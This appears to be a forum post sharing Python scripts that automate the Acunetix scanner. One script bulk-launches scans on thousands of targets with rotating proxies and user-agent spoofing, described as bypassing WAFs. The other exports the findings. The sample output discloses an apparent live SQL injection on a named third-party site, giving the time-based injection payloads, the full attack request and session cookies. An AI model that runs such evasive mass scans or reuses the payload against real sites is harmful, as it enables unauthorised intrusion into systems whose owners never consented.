### Acunetix-Automation

Based on: https://github.com/danialhalo/AcuAutomate I have updated the script a lot to include more functionality.

I suggest not adding more then 3-4k targets in your links input file, acunetix is not designed to handle a lot of targets in general and it might cause problems.

New functions and improvements:
- Adds targets way faster without any errors as original script does ( updated schema for input file and others )
- Scan speed selection ( slow, moderate, fast, faster )
- Included custom user agent selection
- Included stop scans function to mass stop all scans
- Included proxy function to work with file proxy.txt in ip:port format or user:pass:ip:port 1 per line ( only http/https proxy works - not socks )
- Included list scan profiles
- Updated help with everything new and command examples + scan profiles
- Multiple other changes

If there are any bugs, problems or new functions that you want included let me know.

```
#!/usr/bin/env python3

import requests
import json
import argparse
import validators
import sys
import concurrent.futures
import itertools

from argparse import RawTextHelpFormatter

requests.packages.urllib3.disable_warnings()

# --- CONFIGURATION ---
try:
    with open('config.json') as config_file:
        config = json.load(config_file)
except FileNotFoundError:
    print("[!] CRITICAL: 'config.json' not found. Please create it with your Acunetix URL, port, and API key.")
    sys.exit(1)
except json.JSONDecodeError:
    print("[!] CRITICAL: 'config.json' is not valid JSON.")
    sys.exit(1)

# Dictionary mapping short aliases to official Acunetix profile names
PROFILE_ALIASES = {
    "full": "Full Scan",
    "high": "Critical / High Risk",
    "medium": "Critical / High / Medium Risk",
    "xss": "Cross-site Scripting",
    "sql": "SQL Injection",
    "weakpass": "Weak Passwords",
    "crawl": "Crawl Only",
    "owasp": "OWASP Top 10",
    "pci": "PCI checks",
    "without": "Without Top 25",
    "malware": "Malware Scan"
}

tarurl = config['url']+":"+str(config['port'])
headers = {
    "X-Auth": config['api_key'],
    "Content-Type": "application/json"
}

# --- PROXY FUNCTION ---
def load_and_parse_proxies(file_path="proxy.txt"):
    parsed_proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                proxy_config = {"enabled": True, "protocol": "http"}
                
                if len(parts) == 2:
                    proxy_config["address"] = parts[0]
                    proxy_config["port"] = int(parts[1])
                elif len(parts) == 4:
                    proxy_config["username"] = parts[0]
                    proxy_config["password"] = parts[1]
                    proxy_config["address"] = parts[2]
                    proxy_config["port"] = int(parts[3])
                else:
                    print(f"[!] Skipping invalid proxy format in {file_path}: {line}")
                    continue
                parsed_proxies.append(proxy_config)

        if parsed_proxies:
            print(f"[*] Successfully loaded and parsed {len(parsed_proxies)} proxies from {file_path}.")
        else:
            print(f"[!] Warning: Proxy file '{file_path}' was found but contained no valid proxies.")
            
    except FileNotFoundError:
        print(f"[!] Warning: Proxy file '{file_path}' not found. Scans will run without proxies.")
    except (ValueError, IndexError) as e:
        print(f"[!] Error parsing proxy file: {e}. Please check the format.")

    return parsed_proxies


# --- API FUNCTIONS ---
def get_scan_profiles():
    url = f"{tarurl}/api/v1/scanning_profiles"
    try:
        response = requests.get(url, headers=headers, timeout=30, verify=False)
        response.raise_for_status()
        profiles_data = response.json()
        
        if isinstance(profiles_data, dict) and "scanning_profiles" in profiles_data:
            profiles_list = profiles_data["scanning_profiles"]
        else:
            print("[!] Unexpected API response format. Could not find 'scanning_profiles' key.")
            return {}

        return {profile['name']: profile['profile_id'] for profile in profiles_list}

    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching scan profiles: {e}")
        return {}
    except (KeyError, json.JSONDecodeError) as e:
        print(f"[!] Error parsing scan profiles: {e}")
        return {}

def list_profiles():
    print("[*] Fetching available scan profiles...")
    profiles = get_scan_profiles()
    if not profiles:
        print("[!] No scan profiles found or could not connect to API.")
        return
    
    alias_lookup = {v: k for k, v in PROFILE_ALIASES.items()}
    
    print("\n--- Available Scan Profiles ---")
    for name, profile_id in profiles.items():
        alias = alias_lookup.get(name, "N/A")
        print(f"- Alias: \"{alias}\"\n  Name:  \"{name}\"\n  ID:    {profile_id}\n")
    print("-----------------------------\n")
    print("Use the 'Alias' or the full 'Name' in the -t/--type argument.")


def create_scan(target_url, scan_type, speed, user_agent, scan_profiles, proxy_config=None):
    profile_id = scan_profiles.get(scan_type)

    if not profile_id:
        print(f"[!] Scan profile '{scan_type}' not found. Attempting to use 'Full Scan' as default.")
        profile_id = scan_profiles.get(PROFILE_ALIASES.get("full"))
        if not profile_id:
            print(f"\n[!] CRITICAL: Default profile 'Full Scan' also not found. Aborting scan for {target_url}.")
            print("[*] Available profiles are:", ", ".join(f'"{p}"' for p in scan_profiles.keys()))
            return

    def add_and_configure_target(url, speed_setting, ua_string, default_profile_id, proxy_settings):
        create_data = {"address": url, "description": url, "criticality": 10}
        target_id = None
        try:
            response = requests.post(f"{tarurl}/api/v1/targets", data=json.dumps(create_data), headers=headers, timeout=30, verify=False)
            response.raise_for_status()
            target_id = response.json()['target_id']
            print(f"[*] Target created for {url} with ID: {target_id}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error adding target {url}: {e}")
            return None

        config_data = {'default_scanning_profile_id': default_profile_id}
        if speed_setting: config_data['scan_speed'] = speed_setting
        if ua_string: config_data['user_agent'] = ua_string
        if proxy_settings:
            config_data['proxy'] = proxy_settings
            print(f"[*] Assigning proxy {proxy_settings['address']}:{proxy_settings['port']} to {url}")


        if target_id:
            config_url = f"{tarurl}/api/v1/targets/{target_id}/configuration"
            try:
                print(f"[*] Applying configuration to target {target_id}...")
                response = requests.patch(config_url, data=json.dumps(config_data), headers=headers, timeout=30, verify=False)
                response.raise_for_status()
            except requests.exceptions.RequestException as e:
                print(f"[!] Warning: Failed to apply configuration for {url}. Error: {e}")
        
        return target_id

    target_id = add_and_configure_target(target_url, speed, user_agent, profile_id, proxy_config)
    if not target_id:
        print(f"[!] Failed to create target for {target_url}. Aborting scan.")
        return

    scan_data = {
        "target_id": target_id,
        "profile_id": profile_id,
        "schedule": {"disable": False, "start_date": None, "time_sensitive": False},
    }

    try:
        actual_profile_name = next((name for name, pid in scan_profiles.items() if pid == profile_id), "Unknown")
        response = requests.post(f"{tarurl}/api/v1/scans", headers=headers, data=json.dumps(scan_data), verify=False, timeout=30)
        response.raise_for_status()
        print(f"[*] Scan successfully launched for {target_url} using profile '{actual_profile_name}'.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error launching scan for {target_url}: {e}")


def scan_targets_from_file(file_path, scan_type, speed, user_agent, scan_profiles, proxies=None):
    try:
        with open(file_path) as f:
            targets = [x.strip() for x in f.readlines() if x.strip()]
        
        valid_targets = []
        for target in targets:
            if not target.startswith(("http://", "https://")): target = "https://" + target
            if validators.url(target):
                valid_targets.append(target)
            else:
                print(f"[!] Skipping invalid URL from file: {target}")

        if not valid_targets:
            print("[!] No valid URLs found in the file.")
            return

        print(f"[*] Found {len(valid_targets)} valid targets. Starting scans...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            if proxies:
                proxy_cycler = itertools.cycle(proxies)
                futures = {executor.submit(create_scan, target, scan_type, speed, user_agent, scan_profiles, next(proxy_cycler)): target for target in valid_targets}
            else:
                futures = {executor.submit(create_scan, target, scan_type, speed, user_agent, scan_profiles, None): target for target in valid_targets}
            
            for future in concurrent.futures.as_completed(futures):
                target = futures[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] An exception occurred while processing {target}: {e}")

    except FileNotFoundError:
        print(f"[!] Error: The file '{file_path}' was not found.")
    except Exception as e:
        print(f"[!] An unexpected error occurred while reading the file: {e}")

def stop_scan(scan_id):
    url = f"{tarurl}/api/v1/scans/{scan_id}/abort"
    try:
        requests.post(url, headers=headers, verify=False, timeout=60)
        print(f"[-] Abort request sent for scan ID: {scan_id}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to stop scan {scan_id}. Error: {e}")

def stop_specific_scan(target):
    try:
        url = f"{tarurl}/api/v1/scans?q=status:processing,queued;target_address:{target}"
        response = requests.get(url, headers=headers, verify=False)
        response.raise_for_status()
        scans = response.json()["scans"]
        if not scans:
            print(f"[!] No active or queued scan found for target: {target}")
            return
        for scan in scans:
            print(f"[*] Found active scan for '{target}'. ID: {scan['scan_id']}")
            stop_scan(scan["scan_id"])
    except requests.exceptions.RequestException as e:
        print(f"[!] Error retrieving scans to stop. Error: {e}")

def stop_all_scans():
    print("[*] Attempting to stop all active and queued scans...")
    try:
        url = f"{tarurl}/api/v1/scans?q=status:processing,queued"
        response = requests.get(url, headers=headers, verify=False)
        response.raise_for_status()
        scans = response.json().get("scans", [])
        if not scans:
            print("[*] No active or queued scans found to stop.")
            return
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(stop_scan, [scan['scan_id'] for scan in scans])
        print(f"[+] Total abort requests sent: {len(scans)}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error while fetching scans: {e}")
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    banner = r"""
                      __  _         ___
  ____ ________  ____  ___  / /_(_)   __  _____/ (_)
 / __ `/ ___/ / / / __ \/ _ \/ __/ / |/_/_____/ ___/ / /
/ /_/ / /__/ /_/ / / / /  __/ /_/ />  </_____/ /__/ / / 
\__,_/\___/\__,_/_/ /_/\___/\__/_/|_|       \___/_/_/   
 -: by EvilWhales x CFS :-
    """
    
    profile_choices = ", ".join(PROFILE_ALIASES.keys())
    
    parser = argparse.ArgumentParser(
        description="""
AcuAutomate: Unofficial Acunetix CLI
------------------------------------
A command-line tool to automate Acunetix vulnerability scans.
It allows you to start, stop, and manage scans directly from your terminal,
making it perfect for integration into CI/CD pipelines or batch scanning operations.
""",
        epilog=f"""
Commands & Options:
---------------------------------------------------------------------------------------------
scan                     ▶ Launch a new scan. Requires one of -d or -f.

  -d, --domain DOMAIN    A single target domain to scan (e.g., example.com).
  -f, --file FILE        A file with target domains, one per line.
  -t, --type TYPE        Scan profile alias. (Default: full)
                           Choices: {{ {profile_choices} }}
  -s, --speed SPEED      Set scan speed. Choices: {{ slow, moderate, fast, faster }}
  -u, --user-agent UA    Set a custom User-Agent for the scan.
  -p, --proxy            Enable proxies for the scan. Requires a 'proxy.txt' file.
                           Create 'proxy.txt' and add proxies one per line.
                           Format (no auth):    ip:port
                           Format (with auth):  user:pass:ip:port

---------------------------------------------------------------------------------------------
stop                     ⏹ Stop a scan. Requires one of -d or -a.

  -d, --domain DOMAIN    The target domain of the scan to stop.
  -a, --all              Stop ALL running and queued scans.

---------------------------------------------------------------------------------------------
list-profiles            📋 List all available scan profiles and their aliases.

---------------------------------------------------------------------------------------------
Examples:
------------------------------------
# List all available scan profiles
  python3 AcuAutomate.py list-profiles

# Start a specific 'SQL Injection' scan on a single target
  python3 AcuAutomate.py scan -d example.com -t sql

# Start a full scan for all targets in 'links.txt' using a proxy for each one
  python3 AcuAutomate.py scan -f links.txt --proxy
 
# Start an advanced scan on multiple targets that bypasses WAF and acts like a real human ( you can include --proxy if you have proxy in your proxy.txt file / 1 per line - it will assign different proxy to targets from file in ip:port format or user:pass:ip:port format )
 python3 AcuAutomate.py scan -f links.txt -s slow -u "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0" -t high

# Stop an active scan for a specific domain
  python3 AcuAutomate.py stop -d example.com
""",
        formatter_class=RawTextHelpFormatter
    )
    
    if len(sys.argv) < 2:
        print(banner)
        parser.print_help()
        sys.exit(1)
        
    print(banner)
    
    subparsers = parser.add_subparsers(dest="action", required=True)
    
    # --- SCAN SUBPARSER ---
    start_parser = subparsers.add_parser("scan", help=argparse.SUPPRESS)
    start_group = start_parser.add_mutually_exclusive_group(required=True)
    start_group.add_argument("-d", "--domain", help="A single target domain")
    start_group.add_argument("-f", "--file", help="A file with target domains")
    start_parser.add_argument("-t", "--type", default="full", help="Scan profile alias")
    start_parser.add_argument("-s", "--speed", choices=['slow', 'moderate', 'fast', 'faster'], help="Scan speed")
    start_parser.add_argument("-u", "--user-agent", help="Custom User-Agent")
    start_parser.add_argument("-p", "--proxy", action="store_true", help="Use proxies from proxy.txt for the scan engine")
    
    # --- STOP SUBPARSER ---
    stop_parser = subparsers.add_parser("stop", help=argparse.SUPPRESS)
    stop_group = stop_parser.add_mutually_exclusive_group(required=True)
    stop_group.add_argument("-d", "--domain", help="The target domain of the scan to stop")
    stop_group.add_argument("-a", "--all", action='store_true', help="Stop ALL scans")

    # --- LIST PROFILES SUBPARSER ---
    list_parser = subparsers.add_parser("list-profiles", help=argparse.SUPPRESS)
    
    args = parser.parse_args()
    
    scan_profile_name = PROFILE_ALIASES.get(args.type.lower(), args.type) if hasattr(args, 'type') else None
    
    if args.action == "list-profiles":
        list_profiles()
        
    elif args.action == "scan":
        proxies = load_and_parse_proxies() if args.proxy else []
        
        print("[*] Getting scan profiles from Acunetix...")
        scan_profiles = get_scan_profiles()
        if not scan_profiles:
            print("[!] CRITICAL: Could not retrieve scan profiles from Acunetix. Aborting.")
            sys.exit(1)

        if args.domain:
            target_url = args.domain
            if not target_url.startswith(("http://", "https://")): target_url = "https://" + target_url
            if validators.url(target_url):
                first_proxy = proxies[0] if proxies else None
                create_scan(target_url, scan_profile_name, args.speed, args.user_agent, scan_profiles, first_proxy)
            else:
                print(f"[!] Invalid URL specified: {args.domain}")
        elif args.file:
            scan_targets_from_file(args.file, scan_profile_name, args.speed, args.user_agent, scan_profiles, proxies)
            
    elif args.action == "stop":
        if args.domain: stop_specific_scan(args.domain)
        elif args.all: stop_all_scans()
```
create config.json in the same directory as the script with the fallowing content:
```
{
    "url": "https://localhost",
    "port": 3443,
    "api_key": "Your-acunetix-API-key"
}
```
How to get your acunetix API key? It is simple, after you install acunetix ( how to install is in the README.txt ), login into your webpanel, click on the left upper side on "Administrator", then click on "Profile" and scroll all the way down where you will see "Generate new API key" click it and copy your API key and place it in your config.json. You can also replace localhost with your remote IP address if you have selected your acunetix to be remote during installation so that the API can be accessed remotely.

Script to automatically extract all vulnerabilites and sort them by criticality per folder. Critical, High, Medium, Low, Informational

Script will go thru all scans, match vulnerability ids, extract and sort containing all info such as

- Vulnerability ID
- Scan ID
- Target lin
- Severity
- Status
- Last Detected
- Description
- Details
- Impact
- Recommendation
- Request
- Response

Each vulnerability will be saved in it's own .txt file , for example one sql injection:

```
=== Vulnerability ID: 3680221377211664067 ===
Scan ID: 340b7175-00ee-41ab-ac8b-864828872f0e
Target: https://wirexapp.com
Severity: Critical
Status: open
Last Detected: N/A
Description:
N/A

Details:
Path Fragment input <strong><span class="bb-dark">/&lt;s&gt;/[*]</span></strong> was set to <strong><span class="bb-dark">(select(0)from(select(sleep(6)))v)/*&#x27;+(select(0)from(select(sleep(6)))v)+&#x27;&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/</span></strong><br/><br/>

Tests performed:
<ul>
 
 <li>(select(0)from(select(sleep(15)))v)/*&#x27;+(select(0)from(select(sleep(15)))v)+&#x27;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/ =&gt; <strong>15.02</strong></li>
 
 <li>(select(0)from(select(sleep(15)))v)/*&#x27;+(select(0)from(select(sleep(15)))v)+&#x27;&quot;+(select(0)from(select(sleep(15)))v)+&quot;*/ =&gt; <strong>15.037</strong></li>
 
 <li>(select(0)from(select(sleep(6)))v)/*&#x27;+(select(0)from(select(sleep(6)))v)+&#x27;&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/ =&gt; <strong>6.018</strong></li>
 
 <li>(select(0)from(select(sleep(0)))v)/*&#x27;+(select(0)from(select(sleep(0)))v)+&#x27;&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <strong>0.03</strong></li>
 
 <li>(select(0)from(select(sleep(3)))v)/*&#x27;+(select(0)from(select(sleep(3)))v)+&#x27;&quot;+(select(0)from(select(sleep(3)))v)+&quot;*/ =&gt; <strong>3.02</strong></li>
 
 <li>(select(0)from(select(sleep(0)))v)/*&#x27;+(select(0)from(select(sleep(0)))v)+&#x27;&quot;+(select(0)from(select(sleep(0)))v)+&quot;*/ =&gt; <strong>0.074</strong></li>
 
 <li>(select(0)from(select(sleep(6)))v)/*&#x27;+(select(0)from(select(sleep(6)))v)+&#x27;&quot;+(select(0)from(select(sleep(6)))v)+&quot;*/ =&gt; <strong>6.033</strong></li>
</ul>
<br/><br/>Original value: <strong>getAssetRisksHelp</strong>




Impact:
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

Recommendation:
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.

Request:
GET /chainlink/(select(0)from(select(sleep(6)))v)%2f*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*%2f HTTP/1.1

X-Requested-With: XMLHttpRequest

Referer: https://wirexapp.com/

Cookie: AMP_MKTG_df99f09551=JTdCJTdE; AMP_df99f09551=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjIwZTViNDhlZC0yYTIwLTQwNmMtOTE0Ni1hNzRmZmY2MDVkOGIlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzUyOTMyNjQ3NDM2JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTc1MjkzMjczNTUxMyUyQyUyMmxhc3RFdmVudElkJTIyJTNBNDc5JTJDJTIycGFnZUNvdW50ZXIlMjIlM0EzMSU3RA==; __cf_bm=14xFI6SEr20mfdTDerUKzuA8MRGvLq.sO8zBCK1BemQ-1752932632-1.0.1.1-2jMA4ckCwRcF0eTxaEM_fcvzP1VOf14fZvEcOqfiAYchFxVh.u7DeZpmn.WAV8nfbZ9J1tnbaZMaNj.7Rxb3waftgIWgzTx2uqOjXGxlg74; ai_session=T6vDE|1752932648112.5|1752932711036.9; ai_user=Z9Onx|2025-07-18T09:18:22.441Z; wx-ipcountry=NL; wx-userLanguage=%7B%22locale%22%3A%22en%22%2C%22code%22%3A%22en%22%2C%22name%22%3A%22English%22%7D

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Encoding: gzip,deflate,br

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36

Host: wirexapp.com

Connection: Keep-alive


Response:
N/A

==================================================
```

```
import requests
import json
import os
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

SEVERITY_FOLDERS = {
    4: "Critical",
    3: "High",
    2: "Medium",
    1: "Low",
    0: "Informational"
}

def create_output_structure():
    main_folder = "ALL-ACUNETIX-VULNS-EXTRACTED"
    os.makedirs(main_folder, exist_ok=True)
    
    for folder in SEVERITY_FOLDERS.values():
        os.makedirs(os.path.join(main_folder, folder), exist_ok=True)
    
    return main_folder

def load_config():
    try:
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
            if not all(k in config for k in ['url', 'port', 'api_key']):
                raise ValueError("Missing 'url', 'port', or 'api_key' in config.json")
            return config
    except FileNotFoundError:
        print("Error: config.json not found. Please create a config file.")
        exit(1)
    except json.JSONDecodeError:
        print("Error: Invalid JSON in config.json. Please check its format.")
        exit(1)
    except ValueError as e:
        print(f"Configuration Error: {e}")
        exit(1)

def init_session(api_key):
    session = requests.Session()
    session.headers.update({
        'X-Auth': api_key,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    })
    session.verify = False 
    return session

def get_scans_and_process_in_batches(session, base_url, main_folder, limit=100):
    offset = 0
    total_scans_processed = 0
    
    print(f"Starting to fetch and process scans with a limit of {limit} per request...")

    while True:
        try:
            params = {'l': limit, 'c': offset}
            response = session.get(f"{base_url}/api/v1/scans", params=params)
            response.raise_for_status()
            
            data = response.json()
            scans_batch = data.get('scans', [])
            
            if not scans_batch:
                print("No more scans found in this batch. Ending pagination.")
                break
            
            print(f"Fetched {len(scans_batch)} scans (Current total processed: {total_scans_processed + len(scans_batch)}). Processing this batch...")
            
            for scan in scans_batch:
                process_scan(session, base_url, main_folder, scan)
                total_scans_processed += 1
            
            offset += limit
            
        except requests.exceptions.RequestException as e:
            print(f"Error fetching scans at offset {offset}: {e}")
            break
        except json.JSONDecodeError:
            print(f"Error decoding JSON response for scans at offset {offset}.")
            break
            
    print(f"Finished fetching and processing all scans. Total scans processed: {total_scans_processed}")
    return total_scans_processed

def get_scan_results(session, base_url, scan_id):
    try:
        response = session.get(f"{base_url}/api/v1/scans/{scan_id}/results")
        response.raise_for_status()
        results = response.json().get('results', [])
        return results[0].get('result_id') if results else None
    except requests.exceptions.RequestException as e:
        print(f"Error fetching results for scan {scan_id}: {e}")
        return None

def get_scan_vulnerabilities(session, base_url, scan_id, result_id, limit=100):
    all_vulnerabilities = []
    offset = 0
    total_vulns_fetched = 0
    
    print(f"  Fetching vulnerabilities for scan {scan_id} (result {result_id})...")

    while True:
        try:
            params = {'l': limit, 'c': offset}
            response = session.get(f"{base_url}/api/v1/scans/{scan_id}/results/{result_id}/vulnerabilities", params=params)
            response.raise_for_status()
            
            data = response.json()
            vulns_batch = data.get('vulnerabilities', [])
            
            if not vulns_batch:
                break
            
            all_vulnerabilities.extend(vulns_batch)
            total_vulns_fetched += len(vulns_batch)
            
            offset += limit

        except requests.exceptions.RequestException as e:
            print(f"  Error fetching vulnerabilities for scan {scan_id} at offset {offset}: {e}")
            break
        except json.JSONDecodeError:
            print(f"  Error decoding JSON response for vulnerabilities of scan {scan_id} at offset {offset}.")
            break
            
    print(f"  Finished fetching vulnerabilities for scan {scan_id}. Total vulnerabilities: {len(all_vulnerabilities)}")
    return all_vulnerabilities

def get_vulnerability_details(session, base_url, scan_id, result_id, vuln_id):
    try:
        response = session.get(f"{base_url}/api/v1/scans/{scan_id}/results/{result_id}/vulnerabilities/{vuln_id}")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching details for vulnerability {vuln_id}: {e}")
        return None

def sanitize_filename(name):
    invalid_chars = '<>:"/\\|?*'
    for char in invalid_chars:
        name = name.replace(char, '_')
    return name.strip()

def save_vulnerability(main_folder, vuln_details):
    severity = vuln_details.get('severity', 0)
    severity_folder = SEVERITY_FOLDERS.get(severity, "Informational")
    vuln_type = vuln_details.get('vt_name', 'Unknown')
    
    filename = sanitize_filename(f"{vuln_type}_Scan{vuln_details.get('scan_id', 'N/A')}_Vuln{vuln_details.get('vuln_id', 'N/A')}.txt")
    filepath = os.path.join(main_folder, severity_folder, filename)
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"=== Vulnerability ID: {vuln_details.get('vuln_id', 'N/A')} ===\n")
            f.write(f"Scan ID: {vuln_details.get('scan_id', 'N/A')}\n")
            f.write(f"Target: {vuln_details.get('target_fqdn', 'N/A')}\n") 
            f.write(f"Severity: {severity_folder}\n")
            f.write(f"Status: {vuln_details.get('status', 'N/A')}\n")
            f.write(f"Last Detected: {vuln_details.get('last_seen', 'N/A')}\n")
            f.write(f"Description:\n{vuln_details.get('vt_description', 'N/A')}\n\n")
            f.write(f"Details:\n{vuln_details.get('details', 'N/A')}\n\n")
            f.write(f"Impact:\n{vuln_details.get('impact', 'N/A')}\n\n")
            f.write(f"Recommendation:\n{vuln_details.get('recommendation', 'N/A')}\n\n")
            f.write(f"Request:\n{vuln_details.get('request', 'N/A')}\n\n")
            f.write(f"Response:\n{vuln_details.get('response', 'N/A')}\n\n")
            f.write("="*50 + "\n\n")
        print(f"  Saved: {filename} in {severity_folder}/")
    except IOError as e:
        print(f"Error saving vulnerability {filename}: {e}")

def process_vulnerability(session, base_url, main_folder, scan_id, result_id, vuln, target_fqdn):
    vuln_id = vuln.get('vuln_id')
    vuln_type = vuln.get('vt_name', 'Unknown')
    
    print(f"    Processing {vuln_type} (ID: {vuln_id}) for target {target_fqdn}")
    
    vuln_details = get_vulnerability_details(session, base_url, scan_id, result_id, vuln_id)
    if vuln_details:
        vuln_details['scan_id'] = scan_id
        vuln_details['target_fqdn'] = target_fqdn
        save_vulnerability(main_folder, vuln_details)

def process_scan(session, base_url, main_folder, scan):
    scan_id = scan.get('scan_id')
    
    target_fqdn = 'N/A'
    target_id = None

    target_info_from_scan = scan.get('target', {})
    if target_info_from_scan:
        target_id = target_info_from_scan.get('target_id')
        target_fqdn = target_info_from_scan.get('address')
        if not target_fqdn:
            target_fqdn = target_info_from_scan.get('fqdn')
            
    print(f"Processing scan {scan_id} (Initial Target FQDN: {target_fqdn}, Target ID: {target_id})....")
    print(f"  Debug: Full scan target object: {target_info_from_scan}")

    if target_fqdn == 'N/A' and target_id and target_id != 'N/A':
        print(f"  Target FQDN not found in scan object. Attempting to fetch target details for ID: {target_id}")
        try:
            target_response = session.get(f"{base_url}/api/v1/targets/{target_id}")
            target_response.raise_for_status()
            target_details = target_response.json()
            fetched_fqdn = target_details.get('address')
            if not fetched_fqdn:
                fetched_fqdn = target_details.get('fqdn')

            if fetched_fqdn:
                target_fqdn = fetched_fqdn
                print(f"  Successfully fetched target FQDN: {target_fqdn} for ID: {target_id}")
            else:
                print(f"  Fetched target details but 'address' or 'fqdn' key was missing for ID: {target_id}")
        except requests.exceptions.RequestException as e:
            print(f"  Error fetching target details for ID {target_id}: {e}")
        except json.JSONDecodeError:
            print(f"  Error decoding JSON response for target details of ID {target_id}.")

    result_id = get_scan_results(session, base_url, scan_id)
    if not result_id:
        print(f"  No results found for scan {scan_id}. Skipping.")
        return
    
    vulnerabilities = get_scan_vulnerabilities(session, base_url, scan_id, result_id)
    if not vulnerabilities:
        print(f"  No vulnerabilities found for scan {scan_id}. Skipping.")
        return
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(process_vulnerability, session, base_url, main_folder, scan_id, result_id, vuln, target_fqdn) for vuln in vulnerabilities]
        for future in futures:
            try:
                future.result()
            except Exception as exc:
                print(f"  Vulnerability processing generated an exception: {exc}")

def main():
    banner = r"""
**********************************************
* ACUNETIX VULN EXTRACTOR        *
* Coded by MrDark             *
**********************************************
"""
    print(banner)

    main_folder = create_output_structure()
    print(f"Created output folder structure at: {os.path.abspath(main_folder)}")
    
    config = load_config()
    base_url = f"{config['url']}:{config['port']}"
    api_key = config['api_key']
    
    session = init_session(api_key)
    
    total_scans_processed = get_scans_and_process_in_batches(session, base_url, main_folder)
        
    print(f"Vulnerability export completed. Total scans processed: {total_scans_processed}. Results saved in: {os.path.abspath(main_folder)}")

if __name__ == "__main__":
    main()
```

Script is API based same as the script in the first post, so make sure you have config.json created with the fallowing content: ( replace Your-acunetix-API-key with your acual acunetix API key )

```
{
    "url": "https://localhost",
    "port": 3443,
    "api_key": "Your-acunetix-API-key"
}
```

